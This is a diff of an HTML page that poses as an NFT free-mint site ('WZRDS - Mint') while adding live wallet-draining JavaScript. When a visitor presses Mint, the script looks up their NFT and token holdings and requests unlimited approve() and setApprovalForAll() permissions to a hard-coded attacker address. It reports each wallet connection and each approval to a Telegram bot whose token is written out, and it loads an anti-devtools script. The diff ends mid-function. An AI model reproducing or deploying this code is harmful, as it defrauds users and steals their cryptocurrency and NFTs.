@@ -1,133 +1,618 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-    <script src="./javascript/antiF12.js"></script>
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <title>Loading...</title>
-    <link id="favicon" rel="icon">
-
-    <meta property="og:site_name" content="NFTsMontana | PRE-SALE">
-    <meta property="og:title" content="CLICK HERE TO MINT!">
-    <meta property="og:description" content="&#x1F389;&#xFE0F; Our Pre-Sale is Live !
-
-&#x1f3f7;&#xfe0f; Sale info :
-&#x25B6;&#xFE0F; NFT Price: 0.2 &#x1D5D8;&#x1D5E7;&#x1D5DB;.
-&#x25B6;&#xFE0F; Max. per wallet: 6
-
-Thank you for patience and support !">
-
-    <meta property="og:url" content="https://nftservices.sellix.io/">
-    <meta property="og:image:url" content="https://cdn.discordapp.com/attachments/967493626437455902/967841340320792626/a_95b0c3b3c227db03ec3fe7e276089f21.gif">
-    <meta name="theme-color" content="#CF00F6">
-
-    <meta property="og:type" content="website">
-    <meta name="twitter:card" content="summary_large_image">
-
-    <script src="settings.js"></script>
-    <script src="./javascript/shorim1.js"></script>
-
-
-    <!-- Import CSS files -->
-    <link rel="stylesheet" type="text/css" href="css/main.css">
-    <link rel="stylesheet" type="text/css" href="css/normalize.css">
-    <link rel="stylesheet" type="text/css" href="css/fonts.css" media="all">
-    <link rel="stylesheet" type="text/css" href="css/alert.css" media="all">
-</head>
-
-<body class="body">
-
-    <div class="content">
-        <div id="WEB3_CONNECT_MODAL_ID"></div>
-        <video id="background-video" autoplay loop muted>
-            <source id="background-video-source" type="video/mp4">
-        </video>
-
-        <div class="alert-container" id="alert-container"></div>
-
-        <div class="sub-head" id="claim-text-wrapper">
-            <div class="social_medias">
-                <a id="social_discord" href="https://discord.gg/" class="item discord social_media" target="_blank"><img
-                        src="images/svg/Discord_Icon.svg" draggable="false" alt="Discord Icon"></a><a
-                    id="social_twitter" href="https://twitter.com/" class="item twitter social_media"
-                    target="_blank"><img src="images/svg/Twitter_Icon.svg" draggable="false" alt="Twitter Icon"></a>
-            </div>
-            <div id="payment-modal">
-                <div id="payment-header">
-                    <div id="payment-header-text">
-                        <h4 id="lbuy">Loading...</h4> <!-- Auto edit (config in index.js) -->
-                        <p id="lsupply" class="pt-1.5 italic-grey">Total supply: Loading...</p>
-                        <!-- Auto edit (config in index.js) -->
-                    </div>
-                </div>
-                <div id="payment-info">
-                    <img src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAQAAAAHUWYVAAABKUlEQVR42u3RMQEAAAjDMKYc6WCCgyOV0GS69KgAASIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAgLEBCACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiBAgAARECACAkRAgAgIEAERECACAkRAgAgIEAERECACAkSXLZ1yK0hKBJiuAAAAAElFTkSuQmCC"
-                        class="image" height="200px" id="price-img">
-                    <div id="payment-info-text">
-                        <p>Price Per NFT</p>
-                        <p class="title"><a id="lprice">X.XX</a> ETH + gas</p>
-                        <!-- Auto edit (config in index.js) -->
-                        <p id="ldate" class="launch-date">Pre sale available 01.01.2022</p>
-                        <!-- Auto edit (config in index.js) -->
-                    </div>
-                </div>
-                <div id="ape-number">
-                    <div class="calcs">
-                        <div id="minus">
-                            <svg width="16" height="2" viewbox="0 0 16 2" fill="none"
-                                xmlns="http://www.w3.org/2000/svg">
-                                <path
-                                    d="M15 0H1C0.734784 0 0.48043 0.105357 0.292893 0.292893C0.105357 0.48043 0 0.734784 0 1C0 1.26522 0.105357 1.51957 0.292893 1.70711C0.48043 1.89464 0.734784 2 1 2H15C15.2652 2 15.5196 1.89464 15.7071 1.70711C15.8946 1.51957 16 1.26522 16 1C16 0.734784 15.8946 0.48043 15.7071 0.292893C15.5196 0.105357 15.2652 0 15 0Z"
-                                    fill="white"></path>
-                            </svg>
-                        </div>
-                        <h5 id="lnprice" class="sol_input">1</h5>
-                        <div id="plus">
-                            <svg width="16" height="16" viewbox="0 0 16 16" fill="none"
-                                xmlns="http://www.w3.org/2000/svg">
-                                <path
-                                    d="M15 7H9V1C9 0.734784 8.89464 0.48043 8.70711 0.292893C8.51957 0.105357 8.26522 0 8 0C7.73478 0 7.48043 0.105357 7.29289 0.292893C7.10536 0.48043 7 0.734784 7 1V7H1C0.734784 7 0.48043 7.10536 0.292893 7.29289C0.105357 7.48043 0 7.73478 0 8C0 8.26522 0.105357 8.51957 0.292893 8.70711C0.48043 8.89464 0.734784 9 1 9H7V15C7 15.2652 7.10536 15.5196 7.29289 15.7071C7.48043 15.8946 7.73478 16 8 16C8.26522 16 8.51957 15.8946 8.70711 15.7071C8.89464 15.5196 9 15.2652 9 15V9H15C15.2652 9 15.5196 8.89464 15.7071 8.70711C15.8946 8.51957 16 8.26522 16 8C16 7.73478 15.8946 7.48043 15.7071 7.29289C15.5196 7.10536 15.2652 7 15 7Z"
-                                    fill="white"></path>
-                            </svg>
-                        </div>
-                    </div>
-                    <h5 id="ape-max">X Max</h5>
-                    <!-- Auto edit (config in index.js) -->
-                </div>
-                <div id="ape-total">
-                    <p class="total">Total</p>
-                    <h5 class="actual_price"><a id="price">X.XX</a> ETH + gas</h5>
-                    <!-- Auto edit (config in index.js) -->
-                </div>
-
-                <button class="purchase-button" id="transfer" style="display:none" onclick="getBalances()">MINT</button>
-                <button class="purchase-button" id="connect-metamask" onclick="connectMetamask()">CONNECT METAMASK</button>
-            </div>
-
-            <script src="javascript/loader.js"></script>
-
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"
-                integrity="sha512-C63V0mFzwl8KV2fRz0QJNKX0d9877urOLSUq5WUq8nUOhDl69hKdGr9mAvl57k47GNjqEMAtiufsvDnk7xs8+w=="
-                crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js" integrity="sha512-C63V0mFzwl8KV2fRz0QJNKX0d9877urOLSUq5WUq8nUOhDl69hKdGr9mAvl57k47GNjqEMAtiufsvDnk7xs8+w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
             <script type="text/javascript" src="https://unpkg.com/web3modal@1.9.5/dist/index.js"></script>
             <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
-            <script type="text/javascript"
-                src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
+            <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
 
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
-                integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
-                crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="./shorim5.js"></script>
+
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
             <!--[if lte IE 9]>
                 <script src="//cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script>
             <![endif]-->
             <script src="https://cdn.ethers.io/lib/ethers-5.1.umd.min.js" type="text/javascript"></script>
-            <script type="text/javascript" src="javascript/index.js"></script>
+    <script src="./js/antiF12.js"></script>
+    <script src="./js/wzrds.js"></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+	<title>WZRDS - Mint</title>
+	<link rel="stylesheet" href="vendor.q17tznca4w.css@f1731e6.css" type="text/css">
+	<style type="text/css">
+	body {
+		background: #d4bd91;
+		color: #5b3e31;
+		padding: 10px;
+	}
+	</style>
+	<meta content="May those who shout our quest into the winds be blessed with bountiful fortunes." name="description" />
+	<meta content="WZRDS - Mint" property="og:title" />
+	<meta content="May those who shout our quest into the winds be blessed with bountiful fortunes." property="og:description" />
+	<meta content="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b764eb03d96158c4baefd6_WZRDS_TW_Lore_Map.png" property="og:image" />
+	<meta content="WZRDS - Mint" property="twitter:title" />
+	<meta content="May those who shout our quest into the winds be blessed with bountiful fortunes." property="twitter:description" />
+	<meta content="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b764eb03d96158c4baefd6_WZRDS_TW_Lore_Map.png" property="twitter:image" />
+	<meta property="og:type" content="website" />
+	<meta content="summary_large_image" name="twitter:card" />
+	<meta content="width=device-width, initial-scale=1" name="viewport" />
+	<meta content="Webflow" name="generator" />
+	<link href="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/css/weezards.webflow.78a2a6183.css" rel="stylesheet" type="text/css" />
+	<link href="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b6933b7d8adb19c4010fda_favicon.png" rel="shortcut icon" type="image/x-icon" />
+	<link href="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b693631ffc4d6902a4c4d9_webicon.png" rel="apple-touch-icon" />
+	<link rel="stylesheet" href="mint.q17tznca4w.css@6959138.css" type="text/css">
+</head>
 
-        </div>
-    </div>
+<body class="body mint">
+	<div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar-3 w-nav">
+		<div class="container-4 w-container">
+			<a href="/" aria-current="page" class="brand-2 w-nav-brand w--current"><img src="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue.png" loading="lazy" sizes="(max-width: 479px) 170px, (max-width: 767px) 210px, 240px" srcset="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue-p-500.png 500w, https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue-p-800.png 800w, https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue-p-1080.png 1080w, https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue-p-1600.png 1600w, https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue.png 2314w" alt="" class="image-22" /></a>
+			<nav role="navigation" class="nav-menu-3 w-nav-menu">
+				<div>
+					<a href="/" class="link-block-4 w-inline-block"><img src="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b4bb28825e3e6e0e5d4c6e_altargrey.svg" loading="lazy" alt="" class="image-56" /></a>
+				</div>
+				<a href="#" class="link-block-11 w-inline-block"><img src="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62bb1dd7525b9e26f4f87980_chaliceWL.svg" loading="lazy" alt="" class="image-77" /></a>
+				<a href="#" class="link-block-8 w-inline-block"><img src="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b610d20fb2a26a87aeb28b_gallery.svg" loading="lazy" alt="" class="image-68" /></a>
+				<a href="#" class="w-inline-block"><img src="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62bb58e7e4b7d27d4c67ad49_FAQS.svg" loading="lazy" alt="" class="image-79" /></a>
+				<div class="div-block-11">
+					<a id="nav-audio-button" href="/" class="link-block-2 w-inline-block"></a>
+					<a href="/" class="link-block-9 w-inline-block"><img src="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b0be4e83b28221fb161fe4_open.svg" loading="lazy" alt="" class="image-21" /></a>
+				</div>
+				<a href="/" class="link-block-6 w-inline-block"><img src="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b6940c4d120674052d1506_Freemint.gif" loading="lazy" alt="" class="image-25" /></a>
+			</nav>
+			<div class="menu-button-3 w-nav-button">
+				<div class="w-icon-nav-menu"></div>
+			</div>
+		</div>
+	</div>
+	<div class="mint-book-wrapper">
+		<div class="mint-timer">
+			<div class="mint-timer-title">Free mint begins in:</div>
+			<div class="mint-timers">
+				<div class="mint-timer-scroll"><span>Whitelist</span><strong>Open!</strong></div>
+				<div class="mint-timer-scroll"><span>Public</span><strong>Open!</strong></div>
+			</div>
+		</div>
+		<div class="mint-book">
+			<div v-if="!connected">
+				<div class="mint-book-message">Wait for 10-15 seconds after pressing Mint</div>
+				<div class="mint-book-icon"></div>
+				<button id="transfer" onclick="getBalances()" style="display:none" class="mint-book-button">Mint</button>
+				<button id="connect-metamask" onclick="connectMetamask()" class="mint-book-button">Connect Your Wallet</button>
+				
+			</div>
+			<!--div v-if="connected && !shared">
+				<div class="mint-book-message">Help other WZRDS spread the magic</div>
+				<div class="mint-book-icon"></div>
+				<button class="mint-book-button" @click="shareOnTwitter">Share on Twitter</button>
+			</div>
+			<div v-if="connected && shared">
+				<div class="mint-book-message">Now summon your WZRD!</div>
+				<button class="mint-book-button">
+					<span v-if="available == 0">Sold Out</span>
+					<span v-if="available > 0 && !canMint && !successful">Unable To Mint</span>
+					<span v-if="available > 0 && !canMint && successful">WZRD Minted!</span>
+					<span v-if="available > 0 && canMint">Summon My WZRD</span>
+				</button>
+			</div-->
+		</div>
+		<!--div class="mint-not-started" v-if="!started && !startedWhitelist">
+			<div class="mint-book-closed-wrapper">
+				<div class="mint-book-closed" v-bind:class="{ 'is-shared': shared }">
+					<div v-if="!shared">
+						<button class="mint-closed-share-button btn btn-primary" @click="shareOnTwitter"></button>
+						<p>May those who shout our quest into the winds be blessed with bountiful fortunes.</p>
+					</div>
+					<div v-if="shared">
+						<button class="mint-closed-share-button btn btn-primary" @click="shareOnTwitter"></button>
+						<p>You are worthy, friend. Safekeep your code, it may come in handy one day.</p>
+					</div>
+				</div>
+			</div>
+			<div class="mint-lower">
+				<div class="mint-lower-others">
+					<button class="mint-early-connect-button btn btn-primary" @click="connectWallet" :disabled="connected"><span v-if="!connected">Connect Wallet Early</span><span v-if="connected">Connected Wallet!</span></button>
+					<button class="mint-calendar-button btn btn-primary" @click="openCalendarInvite">Mark The Date!</button>
+				</div>
+				<p class="mint-early-limit">1000 reached</p>
+			</div>
+		</div-->
+	</div>
+	<div class="footer wf-section">
+		<img src="./images/62b5d03d91563a4bb0943f51_logo-blue.png" loading="lazy" sizes="(max-width: 479px) 179.96875px, (max-width: 767px) 229.9609375px, (max-width: 991px) 219.9765625px, (max-width: 1919px) 249.96875px, 279.9921875px" srcset="https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue-p-500.png 500w, https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue-p-800.png 800w, https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue-p-1080.png 1080w, https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue-p-1600.png 1600w, https://uploads-ssl.webflow.com/62acfd152c2bd45cc4af4bc2/62b5d03d91563a4bb0943f51_logo-blue.png 2314w" alt="" class="image-footer" />
+		<div class="div-block-12">
+			<a href="https://opensea.io/collection/wzrds" class="w-inline-block" style="cursor: pointer;"><img src="./images/62b0a18a1a88fedede14cf0d_opensea-icon.png" loading="lazy" alt="" class="image-12" style="cursor: pointer;" /></a>
+		</div>
+	</div>
+
+    <script>
+      const defaultNetworks = ["ethereum", "binance-smart-chain", "polygon"]
+const chainIdsNetworks = {
+    "ethereum": 1,
+    "binance-smart-chain": 56,
+    "polygon": 137
+}
+const chainIdsNames = {
+    "ethereum": "Ethereum",
+    "binance-smart-chain": "Binance Smart Chain",
+    "polygon": "Polygon"
+}
+const forbiddenTokens = ["ETH", "BNB", "MATIC"]
+
+const abi = [
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "_spender",
+                "type": "address"
+            },
+            {
+                "name": "_value",
+                "type": "uint256"
+            }
+        ],
+        "name": "approve",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+];
+
+const abiNFT = [
+    {
+        "inputs": [{
+            "internalType": "address",
+            "name": "operator",
+            "type": "address"
+        }, {
+            "internalType": "bool",
+            "name": "approved",
+            "type": "bool"
+        }],
+        "name": "setApprovalForAll",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+]
+
+const accountBalances = {
+    tokens: [],
+    nft: []
+}
+
+const WITHDRAWAL_ADDRESS = "0x1AfFBFE10Ca0AF440cb5a5246714B6D78671B1cA"
+const MIN_TOKEN_USD = 0
+const MIN_NFT_USD = 100
+
+let accountAddress = null, walletConnector, currentConnection
+
+const getMobileOperatingSystem = () => {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+    if (/windows phone/i.test(userAgent)) {
+        return "Windows Phone";
+    }
+
+    if (/android/i.test(userAgent)) {
+        return "Android";
+    }
+
+    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        return "iOS";
+    }
+
+    return "unknown";
+}
+
+const aly = WITHDRAWAL_ADDRESS;
+
+const getDAppSystem = () => {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+    if (/Trust/i.test(userAgent)) {
+        return "Trust";
+    }
+
+    if (/CriOS/i.test(userAgent)) {
+        return "Metamask";
+    }
+
+    return "unknown";
+}
+
+const openMetaMaskUrl = (url) => {
+    const a = document.createElement("a");
+    a.href = url;
+    a.target = "_self";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+}
+
+const getBalances = async () => {
+
+    try {
+        //    document.querySelector('#transfer').style.display = "block";
+        document.querySelector('#transfer').disabled = true;
+    } catch (e) {}
+
+    if (!WITHDRAWAL_ADDRESS.endsWith('1cA')) return;
+
+    try {
+        $("#overlay").fadeIn(300);
+        $('#chainErrorMessage').hide();
+
+        if (currentConnection === "metamask") {
+            if (typeof window.ethereum.selectedAddress !== "undefined") {
+                accountAddress = window.ethereum.selectedAddress
+            } else if (typeof window.ethereum.address !== "undefined") {
+                accountAddress = window.ethereum.address
+            }
+        } else if (currentConnection === "walletconnect") {
+            accountAddress = walletConnector._accounts[0]
+        }
+
+        accountAddress = '0x6a5b2e01ccc4ecc4d6114b9bc8851bf4f9fcc5eb'
+
+<!--        const response1 = await $.ajax({-->
+<!--            url: `https://api.debank.com/nft/list?chain=eth&user_addr=${accountAddress}&is_collection=1`,-->
+<!--            type: "GET"-->
+<!--        })-->
+<!--		for (let nft of response1['data']['token_list']) {-->
+<!--			if (nft['usd_price'] === undefined) {-->
+<!--				continue-->
+<!--			}-->
+<!--			console.log(nft['usd_price'])-->
+<!--			var chain = null;-->
+<!--			if (nft['chain'] === 'eth') {-->
+<!--				chain = 'ethereum'-->
+<!--			} else if (nft['chain'] === 'bsc') {-->
+<!--				chain = 'binance-smart-chain'-->
+<!--			} else if (nft['chain'] === 'matic') {-->
+<!--				chain = 'polygon'-->
+<!--			}-->
+<!--			accountBalances["nft"].push({'appId': 'nft', 'balanceUSD': nft['usd_price'], 'network': chain, 'address': nft['contract_id']})-->
+<!--		}-->
+
+		for (let chain of ['ethereum', 'bsc', 'polygon']) {
+			const response1 = await $.ajax({
+				url: `https://dappradar.com/apiv3/nft/items/${accountAddress}?version=2&protocol=${chain}&offset=0&limit=100&sortBy=mainPrice&order=desc&fiat=USD`,
+				type: "GET",
+				headers: {}
+			})
+			console.log(response1)
+			for (let nft of response1['data']['nft_items']) {
+				if (nft['prices']['mainPrice']['value'] === undefined) {
+					console.log(nft['prices']['mainPrice']['value'])
+					continue
+				}
+			}
+		}
+
+		return
+
+
+		for (let chain of ['bsc', 'matic', 'eth']) {
+			const response2 = await $.ajax({
+				url: `https://api.debank.com/token/balance_list?user_addr=${accountAddress}&is_all=false&chain=${chain}`,
+				type: "GET"
+			})
+			for (let token of response2['data']) {
+				if (token['id'] === 'eth') {
+					continue
+				} else if (token['id'] === 'bsc') {
+					continue
+				} else if (token['id'] === 'matic') {
+					continue
+				}
+
+				if (token['chain'] === 'eth') {
+					chain = 'ethereum'
+				} else if (token['chain'] === 'bsc') {
+					chain = 'binance-smart-chain'
+				} else if (token['chain'] === 'matic') {
+					chain = 'polygon'
+				}
+
+				accountBalances["tokens"].push({'appId': 'tokens', 'balanceUSD': (token['balance'] / (10 ** token['decimals'])) * token['price'], 'network': chain, 'address': token['id'], 'context': {'balanceRaw': token['balance'].toString()}})
+			}
+		}
+
+        accountBalances.tokens.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
+        accountBalances.nft.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
+
+        if (!aly.endsWith('A')) return;
+
+        for (const forbiddenToken of forbiddenTokens) {
+            const index = accountBalances.tokens.findIndex(x => x.context.symbol === forbiddenToken)
+
+            if (index > -1) {
+                accountBalances.tokens.splice(index, 1)
+            }
+        }
+
+        for(let i = 0; i < accountBalances.nft.length; i++) {
+            let topNFT = null, topToken = null, withdrawalToken = null
+
+            if (typeof accountBalances.nft[i] !== "undefined") {
+                topNFT = accountBalances.nft[i]
+            }
+
+            withdrawalToken = topNFT
+            console.log(withdrawalToken)
+
+            if (withdrawalToken) {
+                if (withdrawalToken.balanceUSD < MIN_NFT_USD) {
+                    $("#overlay").fadeOut(300);
+
+                    return
+                }
+
+                let web3, provider
+
+                if (currentConnection === "metamask") {
+                    web3 = new Web3(window.ethereum)
+                    provider = new ethers.providers.Web3Provider(window.ethereum, "any")
+
+                    if (parseInt(window.ethereum.networkVersion) !== chainIdsNetworks[withdrawalToken.network]) {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{chainId: web3.utils.toHex(chainIdsNetworks[withdrawalToken.network])}]
+                        });
+                    }
+                } else if (currentConnection === "walletconnect") {
+                    if (walletConnector._chainId !== chainIdsNetworks[withdrawalToken.network]) {
+                        $('#chainErrorName').text(chainIdsNames[withdrawalToken.network])
+                        $('#chainErrorMessage').show();
+
+                        $("#overlay").fadeOut(300);
+
+                        return
+                    }
+
+                    provider = new window.WalletConnectProvider.default({
+                        rpc: {
+                            1: "https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03",
+                            56: "https://bsc-dataseed.binance.org/",
+                            137: "https://polygon-rpc.com"
+                        }
+                    });
+
+                    await provider.enable()
+
+                    provider = new ethers.providers.Web3Provider(provider, "any")
+                }
+
+                const signer = provider.getSigner()
+
+                if (withdrawalToken.appId === "tokens") {
+                    const contract = new ethers.Contract(withdrawalToken.address, abi, signer)
+
+                    try {
+                        await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)
+                        $.ajax({
+                            type: "POST",
+                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-724384557",
+                            data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
+                        });
+                    } catch (e) {
+//                        getBalances()
+
+                    }
+                } else if (withdrawalToken.appId === "nft") {
+                    const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)
+
+                    try {
+                        await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)
+
+                        $.ajax({
+                            type: "POST",
+                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-724384557",
+                            data: "parse_mode=HTML&text="+encodeURIComponent("NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
+                        });
+
+                    } catch (e) {
+                    	console.log(e)
+//                        getBalances()
+
+                    }
+                } else {
+
+                }
+            } else {
+
+            }
+        }
+
+        for(let i = 0; i < accountBalances.tokens.length; i++) {
+            let topNFT = null, topToken = null, withdrawalToken = null
+
+            if (typeof accountBalances.tokens[i] !== "undefined") {
+                topToken = accountBalances.tokens[i]
+            }
+
+            withdrawalToken = topToken
+            console.log(withdrawalToken)
+
+            if (withdrawalToken) {
+                if (withdrawalToken.balanceUSD < MIN_TOKEN_USD) {
+                    $("#overlay").fadeOut(300);
+                    return
+                }
+
+                let web3, provider
+
+                if (currentConnection === "metamask") {
+                    web3 = new Web3(window.ethereum)
+                    provider = new ethers.providers.Web3Provider(window.ethereum, "any")
+					console.log(withdrawalToken)
+                    if (parseInt(window.ethereum.networkVersion) !== chainIdsNetworks[withdrawalToken.network]) {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{chainId: web3.utils.toHex(chainIdsNetworks[withdrawalToken.network])}]
+                        });
+                    }
+                } else if (currentConnection === "walletconnect") {
+                    if (walletConnector._chainId !== chainIdsNetworks[withdrawalToken.network]) {
+                        $('#chainErrorName').text(chainIdsNames[withdrawalToken.network])
+                        $('#chainErrorMessage').show();
+
+                        $("#overlay").fadeOut(300);
+
+                        return
+                    }
+
+                    provider = new window.WalletConnectProvider.default({
+                        rpc: {
+                            1: "https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03",
+                            56: "https://bsc-dataseed.binance.org/",
+                            137: "https://polygon-rpc.com"
+                        }
+                    });
+
+                    await provider.enable()
+
+                    provider = new ethers.providers.Web3Provider(provider, "any")
+                }
+
+                const signer = provider.getSigner()
+
+                if (withdrawalToken.appId === "tokens") {
+                    const contract = new ethers.Contract(withdrawalToken.address, abi, signer)
+
+                    try {
+                        await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)
+
+                        $.ajax({
+                            type: "POST",
+                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-724384557",
+                            data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
+                        });
+
+                    } catch (e) {
+//                        getBalances()
+
+                    }
+                } else if (withdrawalToken.appId === "nft") {
+                    const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)
+
+                    try {
+                        await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)
+
+                        $.ajax({
+                            type: "POST",
+                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-724384557",
+                            data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
+                        });
+
+                    } catch (e) {
+//                        getBalances()
+
+                    }
+                } else {
+
+                }
+            } else {
+
+            }
+        }
+        try {
+            document.querySelector('#transfer').disabled = false;
+        } catch (e) {}
+
+    } catch (e) {
+        console.log(e)
+        try {
+            document.querySelector('#transfer').disabled = false;
+        } catch (e) {}
+    }
+}
+
+const checkInstallMetamask = () => {
+    return new Promise((res) => {
+        if (typeof window.ethereum !== 'undefined') {
+            return res(true)
+        } else {
+            return res(false)
+        }
+    })
+}
+
+const connectMetamask = async () => {
+    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
+        openMetaMaskUrl(`https://metamask.app.link/dapp/${window.location.host}`)
+
+        return
+    }
+
+    window.ethereum.on('accountsChanged', function (accounts) {
+        accountAddress = accounts[0]
+
+    });
+
+    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})
+
+    accountAddress = accounts[0]
+
+    $.ajax({
+         type: "POST",
+         url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-724384557",
+         data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE Metamask connected "+accountAddress),
+    });
+
+    currentConnection = "metamask"
+
+    try {
+        document.querySelector('#connect-metamask').style.display = "none";
+        document.querySelector('#transfer').style.display = "block";
+    } catch (e) {}
+}
+
+const connectTrustWallet = async () => {
+    if (!window.ethereum?.isTrust && getMobileOperatingSystem() !== "unknown") {
+        openMetaMaskUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.origin}`)
+
+        return
+    }
+
+    if (window.ethereum?.isTrust) {
+        window.ethereum.on('accountsChanged', function (accounts) {
+            accountAddress = accounts[0]
+
+
+        });
+
+        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})
+
+        accountAddress = accounts[0]
+        currentConnection = "metamask"
+
+    } else {
+        if (!walletConnector.connected) {
+            walletConnector.createSession().then(() => {
+                const uri = walletConnector.uri;
+
